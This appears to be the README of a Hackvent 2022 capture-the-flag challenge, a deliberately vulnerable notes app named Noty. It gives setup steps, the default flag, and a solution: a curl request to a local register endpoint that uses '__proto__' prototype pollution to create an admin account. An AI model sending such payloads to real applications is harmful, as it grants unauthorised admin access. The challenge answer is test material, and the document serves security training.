# Noty

This is a challenge for the Hackvent 2022.

## Description

Pollution is everywhere....  
For this reason Santa created Noty! A fixed version of Notme. Bugs this time ;)  
With Noty you can write up all the polluters in your familiy that you see and roast them all at once during christmas.

## Vulnerability

The application is vulnerable to prototype pollution at the endpoints `POST /api/register` and `POST /api/user/ID`.
This allows a user to create an admin account.

## How to setup

Install the dependencies in the root and frontend folder with `yarn`.
After that build the frontend with `yarn run build`. Then build the backend with `yarn run build`.
Configure the DB connection and the flag within the .env file.
Start the whole thing with `yarn run start`.

## Default Flag

`HV22{P0luT1on_1S_B4d_3vERyWhere}`

## Solution

Pollute the prototype and create a new account with
`curl -H "Content-Type: application/json" "http://localhost:8080/api/register" --data '{"__proto__":{ "role": "admin"}, "username": "asdf", "password": "asdf"}'`  
`
Login and see the flag
